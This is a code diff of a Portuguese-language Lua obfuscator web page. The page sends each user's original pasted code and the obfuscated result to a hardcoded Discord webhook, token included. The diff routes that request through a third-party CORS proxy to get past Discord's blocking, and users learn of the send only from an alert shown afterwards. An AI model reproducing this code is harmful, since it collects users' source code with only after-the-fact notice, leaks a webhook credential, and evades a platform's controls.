@@ -88,19 +88,15 @@ transition: 0.3s;
 <script>
 
 /* =========================
-   WEBHOOK DISCORD (LOG)
-   COLE SEU LINK ABAIXO
+   WEBHOOK DISCORD
 ========================= */
-const WEBHOOK_URL = "https://discord.com/api/webhooks/1518003399071633518/Y--YsasJQLv3tZZNQ6PCyqJ4t6h8yo6hDGfPrsAfbCT_GcNdNiMqQKAm11JGiIxz-L3G"; // <-- COLOCA SEU LINK AQUI
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1518003399071633518/Y--YsasJQLv3tZZNQ6PCyqJ4t6h8yo6hDGfPrsAfbCT_GcNdNiMqQKAm11JGiIxz-L3G";
 
 
 function sendLog(original, output){
-fetch(WEBHOOK_URL, {
-  method: "POST",
-  headers: {
-    "Content-Type": "application/json"
-  },
-  body: JSON.stringify({
+  // CORREÇÃO: usa um proxy para contornar bloqueio do Discord
+  const proxy = "https://api.allorigins.win/raw?url=";
+  const dados = JSON.stringify({
     content: "🔥 **NOVO CÓDIGO OFUSCADO**",
     embeds: [
       {
@@ -116,81 +112,49 @@ fetch(WEBHOOK_URL, {
             value: "```lua\n" + (output?.slice(0, 1500) || "Vazio") + "\n```"
           }
         ],
-        footer: {
-          text: "Sistema de Obfuscador • Chaulim Community"
-        },
+        footer: { text: "Sistema de Obfuscador • Chaulim Community" },
         timestamp: new Date().toISOString()
       }
     ]
+  });
+
+  fetch(proxy + encodeURIComponent(WEBHOOK_URL), {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: dados
   })
-})
-.catch(err => console.error("Erro ao enviar log:", err));
+  .then(() => alert("✅ Enviado para o Discord!"))
+  .catch(err => alert("❌ Erro: " + err));
 }
 
 /* =========================
    FUNÇÕES OBFUSCADOR
 ========================= */
 
-// NOME ALEATÓRIO
 function rand(){
 let c="abcdefghijklmnopqrstuvwxyz"
 let n="_"
-for(let i=0;i<10;i++){
-n+=c[Math.floor(Math.random()*c.length)]
-}
+for(let i=0;i<10;i++){n+=c[Math.floor(Math.random()*c.length)]}
 return n
 }
 
-// BASE64
-function b64(s){
-return btoa(unescape(encodeURIComponent(s)))
-}
+function b64(s){return btoa(unescape(encodeURIComponent(s)))}
+function rev(s){return s.split("").reverse().join("")}
+function shift(s){let r="";for(let i=0;i<s.length;i++){r+=String.fromCharCode(s.charCodeAt(i)+2)}return r}
+function toBytes(s){let a=[];for(let i=0;i<s.length;i++){a.push(s.charCodeAt(i))}return a}
 
-// REVERSE
-function rev(s){
-return s.split("").reverse().join("")
-}
-
-// SHIFT CHAR
-function shift(s){
-let r=""
-for(let i=0;i<s.length;i++){
-r+=String.fromCharCode(s.charCodeAt(i)+2)
-}
-return r
-}
-
-// BYTES
-function toBytes(s){
-let a=[]
-for(let i=0;i<s.length;i++){
-a.push(s.charCodeAt(i))
-}
-return a
-}
-
-/* =========================
-   OBFUSCAR + ENVIAR LOG
-========================= */
 
 function obfuscate(){
 let code = document.getElementById("input").value
 if(!code) return alert("⚠️ Cole um código antes!")
 
-// CAMADAS DE PROTEÇÃO
 let c1 = b64(code)
 let c2 = rev(c1)
 let c3 = shift(c2)
 let bytes = toBytes(c3)
 
-// NOMES VARIÁVEIS ALEATÓRIOS
-let v = rand()
-let f1 = rand()
-let f2 = rand()
-let f3 = rand()
-let exec = rand()
+let v = rand(), f1 = rand(), f2 = rand(), f3 = rand(), exec = rand()
 
-// CÓDIGO LUA PROTEGIDO
 let lua = `
 local ${v}={${bytes.join(",")}}
 
@@ -244,31 +208,21 @@ end)
 if not ok then print("❌ CHAULIM ERROR: "..tostring(err)) end
 `
 
-// MOSTRAR NA TELA
 document.getElementById("output").value = lua
-
-// 🔥 ENVIAR LOG PARA O DISCORD
 sendLog(code, lua);
-alert("✅ Código ofuscado e log enviado para o Discord!");
 }
 
-/* =========================
-   COPIAR CÓDIGO
-========================= */
+
 function copyCode(){
 let t = document.getElementById("output").value
 if(!t) return alert("⚠️ Nada para copiar!")
 navigator.clipboard.writeText(t)
-alert("📋 Código copiado para a área de transferência!")
+alert("📋 Copiado!")
 }
 
-/* =========================
-   BAIXAR ARQUIVO .LUA
-========================= */
 function downloadLua(){
 let t = document.getElementById("output").value
 if(!t) return alert("⚠️ Nada para baixar!")
-
 let blob = new Blob([t], {type:"text/plain"})
 let a = document.createElement("a")
 a.href = URL.createObjectURL(blob)
